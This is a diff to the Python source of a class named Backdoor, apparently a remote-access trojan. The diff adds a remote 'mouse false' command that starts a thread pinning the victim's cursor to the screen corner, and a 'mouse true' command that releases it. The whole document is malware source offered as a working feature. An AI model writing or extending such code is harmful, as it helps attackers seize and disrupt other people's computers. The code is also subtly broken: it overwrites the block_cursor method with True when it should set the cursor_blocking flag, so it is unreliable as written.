@@ -31,6 +31,14 @@ class Backdoor:
 		self.connected = False
 		self.connection = None
 
+		self.cursor_blocking = False
+
+	
+	def block_cursor(self):
+		while self.cursor_blocking:
+			pyautogui.moveTo(0, 0)
+
+	
 	def connect(self):
 		while True:
 			if not self.connected:
@@ -156,8 +164,12 @@ class Backdoor:
 
 				elif command.split()[0] == "mouse":
 					if command.split()[1] == "false":
+						self.block_cursor = True
+						block_cursor_thread = threading.Thread(target=self.block_cursor)
+						block_cursor_thread.start()
 						self.reliable_send("[+] Mouse disconnected")
 					elif command.split()[1] == "true":
+						self.block_cursor = False
 						self.reliable_send("[+] Mouse connected")
 					else:
 						self.reliable_send("[-] Can't understand your command")
